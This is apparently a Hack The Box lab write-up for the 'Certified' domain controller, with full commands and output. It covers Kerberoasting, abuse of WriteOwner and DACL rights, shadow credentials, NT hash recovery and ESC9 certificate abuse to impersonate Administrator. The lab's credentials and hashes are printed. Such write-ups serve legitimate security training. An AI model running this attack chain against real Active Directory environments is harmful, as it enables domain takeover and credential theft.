---
description: >-
  As is common in Windows pentests, you will start the Certified box with
  credentials for the following account: Username: judith.mader Password:
  judith09
---

# Certified Write-up - HTB

## Recon

Starting off with an nmap syn scan over all ports:

```
sudo nmap -sS -Pn -n -p- 10.10.11.41 -oN all_syn.txt

#Output:

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49683/tcp open  unknown
49716/tcp open  unknown
49739/tcp open  unknown
55012/tcp open  unknown

```

Using these ports to run over a vulnerability scan.

```
PORTS=$(grep "open" all_syn.txt | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//'); sudo nmap -sVC -Pn -n -p ${PORTS} -oN vuln_scan.txt 10.10.11.41

#Output:
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-28 01:57:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-28T01:59:01+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-28T01:59:00+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-28T01:59:01+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-04-28T01:59:00+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
55012/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Enumeration

This looks to be a DC. Available ports for enumeration are LDAP, SMB.&#x20;

I tried few ways, LDAP enumeration shows heavy AD CS. So we will use certipy:

```
certipy find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41
```

This looks to be vulnerable:

```
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
```

Our user is not from the operator ca group:

```
ldapsearch -x -H ldap://10.10.11.41 -D "judith.mader@certified.htb" -w judith09 -b "DC=certified,DC=htb" "(sAMAccountName=judith.mader)" memberOf

# extended LDIF
#
# LDAPv3
# base <DC=certified,DC=htb> with scope subtree
# filter: (sAMAccountName=judith.mader)
# requesting: memberOf 
#

# Judith Mader, Users, certified.htb
dn: CN=Judith Mader,CN=Users,DC=certified,DC=htb

# search reference
ref: ldap://ForestDnsZones.certified.htb/DC=ForestDnsZones,DC=certified,DC=htb

# search reference
ref: ldap://DomainDnsZones.certified.htb/DC=DomainDnsZones,DC=certified,DC=htb

# search reference
ref: ldap://certified.htb/CN=Configuration,DC=certified,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```

## Foothold

We are not in the group. Let's Kerberoast management\_svc because ldap shows it is kerberoastable:

```
ldapsearch -x -H ldap://10.10.11.41 -D "judith.mader@certified.htb" -w judith09 -b "DC=certified,DC=htb" "(&(objectCategory=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

#Output: 
# management service, Users, certified.htb
dn: CN=management service,CN=Users,DC=certified,DC=htb
sAMAccountName: management_svc
servicePrincipalName: certified.htb/management_svc.DC01
```

```
impacket-GetUserSPNs certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41 -request-user management_svc  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 18:30:51.476756  <never>               

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```

Let's sync our clocks:

```
sudo ntpdate -q 10.10.11.41

#Output:
2025-04-28 05:56:23.329558 (+0300) +165.350478 +/- 0.019813 10.10.11.41 s1 no-leap
```

Setting the clock to match it:

<pre><code><strong>sudo date -s "2025-04-28 05:53:07"
</strong></code></pre>

Let's run impacket again:

```
impacket-GetUserSPNs certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41 -request-user management_svc -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 18:30:51.476756  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$9de02d752a9e7be5ef5812097078c10f$cc8c37c0cf07239b025eb0f525701502f57803553d3987122922b73d5b2808e55c7cf86deb9cc1740ffd1e7edff68c46fba15c1e8b6d43dd0ea4b104882b8a09c3499673959b6d8ff32c46825a82b57abc37560d2035fb1857bc48157a1add72a5f05911ab604d85a4f2e7ce8f1263861bc6b26e7eb5ba4fa5e2eade086f76cf62a2fd6b66dadf4d40278b35ffc0c7e90862618bf1494fa876f7c7fd4559fa12e983702862451523bc1785f201e2b33fd1ade1504962d8f1eeacfacb5c579a237e02c39dd0f9f5f6054d1581a0067e8349806c820359e97ea7e86551e8989c5f6a0fce7a3b9a1645464800e5b916782cc6b76229b866394629c167289aced970ce14a0bae57c358cb1fdae4605515f091355405c43f7f5c0d6b9ac7e65c2482b444fe8538adf4c7ea315ae6832fa0eb6d62d9a9a6c4fc053f9c116a3d413dfcfcaec099d503c9d9b02ba64a66218ccbdea194c4515c55e1684d1a9df5fface053817e55bca8c7d91d61f334456b730b37f196938050ebc36677c431367d440841bd7e2b89fca0c72939276575de283b23ecb7b19c868d1926496fe0bc5912aff5143d6d35118a4a1175c21ff72c17a83dcd321dae820148b3ec9afc5c3d7ba5bbb01734291129c1e6c6e2be7c55307d85e2baaddf85c49280f90be3c1e0e7bb0395c2557de8d85ee6aebb76c27faa34db97f4dd90ff0d642027c1264ca1c6784b1751aa558e0a8801bca4176b06c70060679baa30d6ce3901af451e7ec3d36e50bdb5ed9ca3ad868340aaed20102c1e5ebb6be213a4ae8c89b367110f747abc60d28f46b4c4c8c7ef5576889c707117c48e9f9b8b46afdd3c0ddcdecb9fb80b35505ff65125638a5d92a68eb77839e6a31197da862ece00c9a404bcea8d2652f91418670ba9bee727379bb92be5206770d8198a3c0c21f908bc72c2c0c938c9612a45147e239952b5c428d1f1c68b4ca9c0e24bf77663989611f6645f64c28471611eccc8b8b5daa0f65b2896167bd49349c431216330f483c84d45ac1f8cad21af0961ec91d5ed12675adf43af94d54016b100da00acf5e452a450d5fd45b82e504a8bd115f4fb42d6366ec8d651285ade0c8f46594c149a479ca8a4141c7369200b5414a5f60c3f239733d424c6777863bffb9b13414b10ad7c9b9135ee81a8637b4dc5f6e83c738bf17caa33478d95ceda0d909c4b24f52adcba7af017a29af1f1db3ffebd43ff5b11e52056102429fa72cfc70f07c9b6a382827bc7acb7ccb81b73b572dd72bb230d0568781d41a6af91867ab0fc9f55e7c2e2ad3f23475b4f9c7f4870811de8d910fadff8a2ce139a80ff88bb24be812976ee29d0a5bcf5a82a1e345522b297f943c62019fb73a02b0e99e3d8088d20f2c4cba66a4b988198bbd281b7671b75500b7376b53b9137951e1045b268d5eed09bf78c26cf0a8b2572fe583119a2478b267ac3616932cebb32b036ce45043dc77bc6d6d49604fe9b19b36f981da6dc1e8e4fcc9bb4d670a75da179ffbf80766be24f01c1d53b2126e25eeb2671de842102628b9650bbc7be816bf66950acd520f
```

Uncrackable.

```
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified...cd520f
Time.Started.....: Sun Apr 27 23:06:40 2025 (15 secs)
Time.Estimated...: Sun Apr 27 23:06:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/czr/HTB/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   989.8 kH/s (0.58ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b6d3831303838] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 63%

```

I tried various ways, but everything fails. Weird.

Bloodhound says we have WriteOwner Permissions over management@certified.htb:

<figure><img src="../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

I am trying to get this.

So, let's add name ourselves the new owner of the group:&#x20;

```
impacket-owneredit -action write -new-owner 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

Let's now add a new ACE that will give us WriteMembers over Management:

```
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

Let's now add ourselves in the group:

```
python3 bloodyAD.py -d certified.htb -u judith.mader -p judith09 --host 10.10.11.41 add groupMember 'CN=Management,CN=Users,DC=certified,DC=htb' 'judith.mader'
```

Verifying via LDAP query:

<pre><code><strong>ldapsearch -x -H ldap://10.10.11.41 -D "judith.mader@certified.htb" -w judith09 -b "CN=Management,CN=Users,DC=certified,DC=htb" member
</strong># extended LDIF
#
# LDAPv3
# base &#x3C;CN=Management,CN=Users,DC=certified,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: member 
#

# Management, Users, certified.htb
dn: CN=Management,CN=Users,DC=certified,DC=htb
member: CN=management service,CN=Users,DC=certified,DC=htb
member: CN=Judith Mader,CN=Users,DC=certified,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

</code></pre>

After few minutes/hours, I realized the path does not want us to change management\_svc password, but maybe do a shadow credentials attack.&#x20;

```
pywhisker -d certified.htb -u "judith.mader" -p 'judith09' --target "management_svc" --action "add" --filename DC$                                           
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 72aac68b-a642-54bc-762a-ffb8da93b1f0
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: DC$.pfx
[+] PFX exportiert nach: DC$.pfx
[i] Passwort für PFX: bQWW4lwVnl1BCxOFZyaF
[+] Saved PFX (#PKCS12) certificate & key at path: DC$.pfx
[*] Must be used with password: bQWW4lwVnl1BCxOFZyaF
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

Sweeeeet!!! We got the pfx!

Let's get the damn TGT now!

<pre><code><strong>python3 /home/czr/HTB/Timelapse/Enum/winrm/PKINITtools/gettgtpkinit.py -cert-pfx DC$.pfx -pfx-pass 'bQWW4lwVnl1BCxOFZyaF' 'certified.htb/management_svc' DC$.ccache
</strong><strong>2025-04-28 07:56:57,074 minikerberos INFO     Loading certificate and key from file
</strong>INFO:minikerberos:Loading certificate and key from file
2025-04-28 07:56:57,104 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 07:57:18,779 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 07:57:18,779 minikerberos INFO     f4f2c6c8b96c9117b0d5933334a73510fe5674a24719a208a0ff84ca58cc221d
INFO:minikerberos:f4f2c6c8b96c9117b0d5933334a73510fe5674a24719a208a0ff84ca58cc221d
2025-04-28 07:57:18,782 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
</code></pre>



Getting the NT Hash for management\_svc:

```
sudo python3 /home/czr/HTB/Timelapse/Enum/winrm/PKINITtools/getnthash.py -key f4f2c6c8b96c9117b0d5933334a73510fe5674a24719a208a0ff84ca58cc221d certified.htb/management_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

Change ca\_operator password:

<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

Let's get a pfx:

```
/home/czr/.local/bin/certipy req -u 'ca_operator@certified.htb' -p 'PassPass123!' -ca 'certified-DC01-CA' -target 10.10.11.41 -template 'CertifiedAuthentication' -upn 'administrator@certified.htb' -debug
```

<figure><img src="../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

I checked the templates again as operator ca:

```
[!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

Ran ESC9 PrivEsc attack:&#x20;

Setting the UPN of ca\_operator to Administrator so that we can retrieve Administrator .pkx:

<pre><code><strong>/home/czr/.local/bin/certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
</strong></code></pre>

Requesting .pfx:

```
/home/czr/.local/bin/certipy req -u ca_operator -p 'PassPass123!'  -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
```

Setting back ca\_operator UPN to it:

```
home/czr/.local/bin/certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
```

Authentincating:

```
/home/czr/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```

<figure><img src="../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
